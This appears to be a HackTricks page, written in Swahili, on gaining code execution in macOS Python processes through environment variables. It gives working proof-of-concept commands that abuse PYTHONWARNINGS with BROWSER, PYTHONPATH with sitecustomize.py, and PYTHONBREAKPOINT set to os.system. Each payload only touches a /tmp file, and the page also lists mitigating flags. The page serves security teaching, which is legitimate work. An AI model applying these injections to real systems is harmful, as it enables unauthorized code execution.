# Injection ya Application za Python za macOS

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia environment variables `PYTHONWARNINGS` na `BROWSER`

Ikiwa mshambuliaji anaweza kudhibiti environment ya Python process, mchanganyiko wa `PYTHONWARNINGS` na `BROWSER` unaweza kuanzisha command execution Python inapo-import module ya `antigravity` wakati wa kuchakata warning option iliyoundwa mahsusi. Technique hii inategemea `antigravity` kufungua URL kwa kutumia module ya Python ya `webbrowser`, ambayo huheshimu environment variable ya `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Kupitia `PYTHONPATH` na `sitecustomize.py`

Wakati wa uanzishaji wa kawaida, Python huongeza njia maalum za site kupitia module ya `site`, kisha hujaribu ku-import module inayoitwa `sitecustomize`. Kwa kuweka directory inayoweza kusomwa na attacker mwanzoni mwa `PYTHONPATH`, attacker anayesimamia process environment anaweza kufanya Python i-import payload kabla ya target script. Flag ya `-S` huzima uanzishaji wa kiotomatiki wa `site`, huku isolated mode (`-I`) ikipuuza `PYTHONPATH` na kuhusisha `-s` pamoja na `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Kupitia `PYTHONBREAKPOINT`

Tangu Python 3.7 (PEP 553), `breakpoint()` ya built-in hu-import na kuita chochote ambacho `sys.breakpointhook` inaelekeza, na target hiyo huchukuliwa kutoka kwenye **`PYTHONBREAKPOINT`** environment variable (`package.module.callable`). Ku-import module iliyotajwa na kuita callable zote mbili hutekelezwa kabla debugger haijaonekana kwa kawaida, hivyo attacker anayedhibiti environment ya process inayofikia `breakpoint()` (jambo la kawaida katika maintenance/debug scripts, na wakati mwingine huachwa kwenye production paths) hupata code execution.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
Tofauti na `PYTHONWARNINGS`/`PYTHONPATH`, hii inahitaji target ifikie kwa kweli mwito wa `breakpoint()`, lakini pia inafanya kazi kupitia **import side effects** za module iliyotajwa (ielekeze kwenye module yoyote inayoweza ku-importiwa — kwa mfano iliyowekwa ya kwanza kwenye `PYTHONPATH` — ambayo top level yake huendesha code). Kuweka `PYTHONBREAKPOINT=0` huzima hook kabisa.

## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook ya usanidi maalum wa tovuti](https://docs.python.org/3/library/site.html)
- [3] [Mstari wa amri na mazingira ya Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Built-in breakpoint() na PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
